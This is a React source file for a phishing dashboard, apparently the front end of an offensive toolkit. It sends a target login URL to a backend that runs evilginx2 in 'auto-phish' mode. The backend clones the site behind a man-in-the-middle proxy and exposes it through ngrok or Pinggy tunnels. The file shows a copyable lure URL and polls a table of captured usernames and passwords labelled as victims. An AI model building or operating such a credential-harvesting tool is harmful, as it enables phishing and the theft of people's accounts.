import React, { useState } from 'react';
import socket from '../utils/socket';

function Phisher() {
    const [targetUrl, setTargetUrl] = useState('');
    const [status, setStatus] = useState('idle'); // idle, cloning, active, error
    const [statusMessage, setStatusMessage] = useState('SYSTEM READY');
    const [logs, setLogs] = useState([]);
    const [credentials, setCredentials] = useState([]);
    const [lureUrl, setLureUrl] = useState(null);
    const [showSettings, setShowSettings] = useState(false);
    const [config, setConfig] = useState({ pinggy_token: '', ngrok_token: '' });

    // Poll for credentials & Settings
    React.useEffect(() => {
        const fetchCreds = async () => {
            try {
                const res = await fetch('/api/phisher/credentials');
                if (res.ok) {
                    const data = await res.json();
                    setCredentials(data);
                }
            } catch (e) {
                console.error("Poll error", e);
            }
        };

        const fetchSettings = async () => {
            try {
                const res = await fetch('/api/settings');
                if (res.ok) {
                    const data = await res.json();
                    setConfig(prev => ({ ...prev, ...data }));
                }
            } catch (e) {
                console.error("Settings error", e);
            }
        };

        const interval = setInterval(fetchCreds, 3000);
        fetchCreds(); // Initial
        fetchSettings(); // Initial Settings

        return () => clearInterval(interval);
    }, []);

    const saveSettings = async () => {
        try {
            await fetch('/api/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config)
            });
            setShowSettings(false);
            setLogs(prev => [...prev, `[*] Configuration Saved.`]);
        } catch (e) {
            console.error("Save error", e);
        }
    };


    const handleAutoPhish = async () => {
        if (!targetUrl) return;
        setStatus('cloning');
        setStatusMessage('INITIALIZING ATTACK VECTOR...');
        setLureUrl(null); // Reset
        setLogs(prev => [...prev, `[*] Initiating Auto-Phish for: ${targetUrl}`]);

        try {
            const response = await fetch('/api/hexstrike/scan', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    tool: 'evilginx2',
                    target: targetUrl,
                    options: { mode: 'auto-phish' }
                }),
            });

            const data = await response.json();
            if (!response.ok) {
                setLogs(prev => [...prev, `[!] Error: ${data.error}`]);
                setStatus('error');
                setStatusMessage('OPERATION FAILED');
            }
        } catch (error) {
            setLogs(prev => [...prev, `[!] Connection Error: ${error.message}`]);
            setStatus('error');
            setStatusMessage('CONNECTION LOST');
        }
    };

    React.useEffect(() => {
        const handleLog = (msg) => {
            // Check if msg is object or string
            const text = typeof msg === 'string' ? msg : (msg.data || JSON.stringify(msg));

            // Filter for relevant logs or show all
            setLogs(prev => {
                // Keep only last 50 logs to prevent overflow
                const newLogs = [...prev, text];
                if (newLogs.length > 50) return newLogs.slice(newLogs.length - 50);
                return newLogs;
            });

            // Auto-detect success/completion
            if (text.includes("Phishing Site Active") || text.includes("PUBLIC PHISHING URL") || text.includes("LURE_URL:") || text.includes("Ngrok URL ACTIVE")) {
                setStatus('active');
                setStatusMessage('SESSION ACTIVE // LISTENING');

                // Extract URL if present
                const urlMatch = text.match(/(https?:\/\/[^\s]+)/);
                if (urlMatch) {
                    setLureUrl(urlMatch[0]);
                }
            }
        };

        socket.on('log', handleLog);

        return () => {
            socket.off('log', handleLog);
        };
    }, []);

    return (
        <div className="dashboard-container cyber-theme">
            <header className="dashboard-header">
                <div>
                    <h1 className="glitch-text" data-text="PHISHER // MODULE">PHISHER // MODULE</h1>
                    <p className="subtitle terminal-text">&gt; Advanced Social Engineering & Credential Harvesting</p>
                </div>
                <div className={`status-indicator ${status}`}>
                    <span className="blink">●</span> {statusMessage}
                </div>
            </header>

            <div className="content-grid">
                {/* Auto-Phisher Card */}
                <div className="dashboard-card cyber-card full-width">
                    <div className="card-header cyber-header">
                        <h2><i className="fas fa-biohazard"></i> AUTO_PHISH_EXEC</h2>
                    </div>
                    <div className="card-body">
                        <p className="description-text terminal-text">
                            // TARGET ACQUISITION PROTOCOL
                        </p>
                        <ul className="feature-list" style={{ marginBottom: '20px', color: '#ff3333' }}>
                            <li><i className="fas fa-crosshairs"></i> CLONE_INTERFACE [HIGH_FIDELITY]</li>
                            <li><i className="fas fa-network-wired"></i> CONFIGURE_MITM_PROXY</li>
                            <li><i className="fas fa-link"></i> GENERATE_LURE_URL</li>
                            <li><i className="fas fa-shield-alt"></i> ACTIVATE_SPIDERMAN_SHIELD</li>
                            <li><i className="fas fa-globe"></i> EXPOSE_VIA_PINGGY_TUNNEL</li>
                        </ul>

                        <div className="input-group cyber-input-group" style={{ maxWidth: '800px' }}>
                            <span className="prompt">{`root@kali:~$`}</span>
                            <input
                                type="text"
                                placeholder="target_url (e.g., https://login.example.com)"
                                value={targetUrl}
                                onChange={(e) => setTargetUrl(e.target.value)}
                                className="search-input cyber-input"
                            />
                            <button
                                onClick={handleAutoPhish}
                                className="scan-btn cyber-btn"
                                disabled={status === 'cloning' || status === 'active'}
                            >
                                {status === 'cloning' ? 'EXECUTING...' : 'INITIALIZE_ATTACK'}
                            </button>
                            <button
                                onClick={() => setShowSettings(true)}
                                className="cyber-btn"
                                style={{ marginLeft: '10px', background: 'transparent', border: '1px solid #444' }}
                                title="Configure Tunnels"
                            >
                                <i className="fas fa-cog"></i>
                            </button>
                        </div>

                        {/* Settings Modal */}
                        {showSettings && (
                            <div className="modal-overlay">
                                <div className="modal-content cyber-card" style={{ maxWidth: '500px', margin: '100px auto', padding: '20px', position: 'relative' }}>
                                    <div className="card-header cyber-header">
                                        <h2><i className="fas fa-sliders-h"></i> CONFIGURATION</h2>
                                    </div>
                                    <div className="card-body">
                                        <div className="form-group" style={{ marginBottom: '15px' }}>
                                            <label style={{ display: 'block', color: '#888', marginBottom: '5px' }}>Pinggy.io Token (Command/User)</label>
                                            <input
                                                type="text"
                                                className="cyber-input"
                                                style={{ border: '1px solid #333', width: '100%' }}
                                                placeholder="e.g. token or user"
                                                value={config.pinggy_token}
                                                onChange={e => setConfig({ ...config, pinggy_token: e.target.value })}
                                            />
                                            <small style={{ color: '#555' }}>Leave empty for free tier (random subdomain).</small>
                                        </div>
                                        <div className="form-group" style={{ marginBottom: '15px' }}>
                                            <label style={{ display: 'block', color: '#888', marginBottom: '5px' }}>Ngrok Authtoken</label>
                                            <input
                                                type="password"
                                                className="cyber-input"
                                                style={{ border: '1px solid #333', width: '100%' }}
                                                placeholder="Ngrok Authtoken"
                                                value={config.ngrok_token}
                                                onChange={e => setConfig({ ...config, ngrok_token: e.target.value })}
                                            />
                                        </div>
                                        <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '20px' }}>
                                            <button className="cyber-btn" style={{ background: '#333' }} onClick={() => setShowSettings(false)}>CANCEL</button>
                                            <button className="cyber-btn" onClick={saveSettings}>SAVE_CONFIG</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Lure URL Display */}
                        {lureUrl && (
                            <div className="lure-box" style={{ marginTop: '20px', border: '1px solid #00ff9d', padding: '15px', background: 'rgba(0, 255, 157, 0.05)' }}>
                                <h3 className="blink" style={{ color: '#00ff9d', margin: '0 0 10px 0' }}>⚠️ ATTACK VECTOR READY</h3>
                                <div className="url-display" style={{ display: 'flex', gap: '10px', alignItems: 'center' }}>
                                    <span className="label" style={{ color: '#888' }}>LURE URL:</span>
                                    <a href={lureUrl} target="_blank" rel="noopener noreferrer" className="url" style={{ color: '#00ff9d', fontWeight: 'bold' }}>{lureUrl}</a>
                                    <button className="copy-btn cyber-btn" style={{ padding: '5px 10px', fontSize: '0.8em' }} onClick={() => navigator.clipboard.writeText(lureUrl)}>
                                        COPY
                                    </button>
                                </div>
                            </div>
                        )}
                    </div>
                </div>

                {/* Status / Output Panel */}
                <div className="dashboard-card cyber-card full-width">
                    <div className="card-header cyber-header">
                        <h2><i className="fas fa-terminal"></i> LIVE_INTEL_STREAM</h2>
                    </div>
                    <div className="card-body terminal-view cyber-terminal">
                        {logs.length === 0 ? (
                            <p className="placeholder-text blink">Waiting for mission start...</p>
                        ) : (
                            logs.map((log, i) => (
                                <div key={i} className="log-line">
                                    <span className="timestamp">[{new Date().toLocaleTimeString()}]</span> {log}
                                </div>
                            ))
                        )}
                    </div>
                </div>

                {/* Live Credential Table */}
                <div className="dashboard-card cyber-card full-width">
                    <div className="card-header cyber-header">
                        <h2><i className="fas fa-skull"></i> CAPTURED_CREDENTIALS</h2>
                        <span className="badge cyber-badge">{credentials.length} VICTIMS</span>
                    </div>
                    <div className="card-body">
                        {credentials.length === 0 ? (
                            <div className="empty-state">
                                <i className="fas fa-user-secret"></i>
                                <p className="terminal-text">NO DATA INTERCEPTED. WAITING FOR TRAFFIC...</p>
                            </div>
                        ) : (
                            <div className="table-responsive">
                                <table className="vuln-table cyber-table">
                                    <thead>
                                        <tr>
                                            <th>TIMESTAMP</th>
                                            <th>TYPE</th>
                                            <th>IDENTITY</th>
                                            <th>PAYLOAD / ACTION</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {credentials.map((cred, idx) => (
                                            <tr key={idx}>
                                                <td className="terminal-text">{new Date(cred.timestamp).toLocaleTimeString()}</td>
                                                <td>
                                                    <span className={`severity-badge ${cred.type === 'credential' ? 'critical-cyber' : 'warning-cyber'}`}>
                                                        {cred.type.toUpperCase()}
                                                    </span>
                                                </td>
                                                <td className="terminal-text" style={{ color: '#00ff9d' }}>{cred.username || '---'}</td>
                                                <td className="data-cell">
                                                    {cred.type === 'credential' ? (
                                                        <span className="password-blur cyber-blur">{cred.password}</span>
                                                    ) : (
                                                        <span className="info-text">{cred.data ? cred.data.substring(0, 50) + '...' : ''}</span>
                                                    )}
                                                </td>
                                            </tr>
                                        ))}
                                    </tbody>
                                </table>
                            </div>
                        )}
                    </div>
                </div>
            </div>

            <style jsx>{`
                /* Cyber Theme - Red Teaming Edition */
                .cyber-theme {
                    --bg-dark: #050505;
                    --primary-red: #ff3333;
                    --neon-green: #00ff9d;
                    --dim-gray: #1a1a1a;
                    --text-color: #e0e0e0;
                    font-family: 'Courier New', monospace;
                    background-color: var(--bg-dark);
                    min-height: 100vh;
                    color: var(--text-color);
                    padding: 20px;
                }

                .glitch-text {
                    font-size: 2.5rem;
                    color: var(--primary-red);
                    text-shadow: 2px 2px 0px #000, -1px -1px 0 #cc0000;
                    letter-spacing: 2px;
                    margin-bottom: 5px;
                }

                .terminal-text {
                    font-family: 'Courier New', monospace;
                    color: #888;
                }

                .dashboard-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border-bottom: 2px solid var(--primary-red);
                    padding-bottom: 20px;
                    margin-bottom: 30px;
                }

                .status-indicator {
                    color: var(--neon-green);
                    border: 1px solid var(--neon-green);
                    padding: 8px 15px;
                    font-weight: bold;
                    letter-spacing: 1px;
                    background: rgba(0, 255, 157, 0.05);
                }
                .status-indicator.error { color: var(--primary-red); border-color: var(--primary-red); background: rgba(255, 51, 51, 0.05); }

                .blink { animation: blinker 1.5s linear infinite; }
                @keyframes blinker { 50% { opacity: 0; } }

                /* Cards */
                .cyber-card {
                    background: #0a0a0a;
                    border: 1px solid #333;
                    box-shadow: 0 0 10px rgba(0,0,0,0.8);
                    border-left: 3px solid var(--primary-red);
                    margin-bottom: 20px;
                }

                .cyber-header {
                    background: rgba(255, 51, 51, 0.05);
                    border-bottom: 1px solid #333;
                    color: var(--primary-red);
                    padding: 15px;
                }
                .cyber-header h2 { font-weight: normal; letter-spacing: 1px; font-size: 1.2rem; margin: 0; display: flex; align-items: center; gap: 10px; }

                /* Inputs */
                .cyber-input-group {
                    display: flex;
                    align-items: center;
                    background: #000;
                    border: 1px solid #444;
                    padding: 5px;
                    margin-top: 20px;
                }
                .prompt { color: var(--neon-green); margin-left: 10px; font-weight: bold; margin-right: 10px; }
                .cyber-input {
                    background: transparent;
                    border: none;
                    color: #fff;
                    font-family: 'Courier New', monospace;
                    flex-grow: 1;
                    padding: 10px;
                    font-size: 1rem;
                }
                .cyber-input:focus { outline: none; }

                .cyber-btn {
                    background: var(--primary-red);
                    color: #000;
                    font-weight: bold;
                    border: none;
                    text-transform: uppercase;
                    transition: all 0.3s ease;
                    padding: 10px 20px;
                    cursor: pointer;
                }
                .cyber-btn:hover {
                    background: #cc0000;
                    box-shadow: 0 0 15px var(--primary-red);
                    color: #fff;
                }
                .cyber-btn:disabled { 
                    background: #333; color: #666; box-shadow: none; cursor: not-allowed;
                }

                /* Terminal */
                .cyber-terminal {
                    background: #000;
                    border: 1px solid #333;
                    color: #00ff9d;
                    font-size: 0.9rem;
                    padding: 20px;
                    font-family: 'Courier New', monospace;
                }
                .log-line { border-left: 2px solid transparent; padding-left: 5px; margin-bottom: 4px; word-break: break-all; }
                .log-line:hover { border-left: 2px solid var(--primary-red); background: rgba(255,255,255,0.02); }
                .timestamp { color: #555; margin-right: 10px; }

                /* Table */
                .cyber-table { width: 100%; border-collapse: collapse; }
                .cyber-table th {
                    background: rgba(255, 51, 51, 0.1);
                    color: var(--primary-red);
                    border-bottom: 2px solid var(--primary-red);
                    font-family: 'Courier New', monospace;
                    text-align: left;
                    padding: 12px;
                }
                .cyber-table td {
                    border-bottom: 1px solid #222;
                    padding: 12px;
                    color: #ccc;
                }
                
                .severity-badge.critical-cyber {
                    background: var(--primary-red);
                    color: #000;
                    box-shadow: 0 0 5px var(--primary-red);
                    font-weight: bold;
                    padding: 2px 6px;
                }
                .severity-badge.warning-cyber {
                    background: transparent;
                    border: 1px solid #ffbd2e;
                    color: #ffbd2e;
                    padding: 2px 6px;
                }
                
                .cyber-blur { 
                    filter: blur(5px); 
                    color: var(--primary-red);
                    text-shadow: 0 0 5px var(--primary-red);
                    cursor: pointer;
                    transition: all 0.2s;
                }
                .cyber-blur:hover { filter: none; text-shadow: none; }
                
                .cyber-badge {
                    background: var(--primary-red);
                    color: #000;
                    border-radius: 0;
                    padding: 2px 8px;
                    font-weight: bold;
                    margin-left: 10px;
                    font-size: 0.8rem;
                }
                
                .feature-list { list-style: none; padding: 0; }
                .feature-list li { margin: 8px 0; display: flex; align-items: center; }
                .feature-list li i { font-size: 0.8rem; margin-right: 10px; width: 20px; text-align: center; }
                
                .empty-state { padding: 40px; text-align: center; opacity: 0.5; }
                .empty-state i { font-size: 3rem; margin-bottom: 15px; color: #444; }
                
                .modal-overlay {
                    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
                    background: rgba(0,0,0,0.8);
                    z-index: 1000;
                    display: flex; justify-content: center; alignItems: flex-start;
                }
            `}</style>
        </div>
    );
}

export default Phisher;
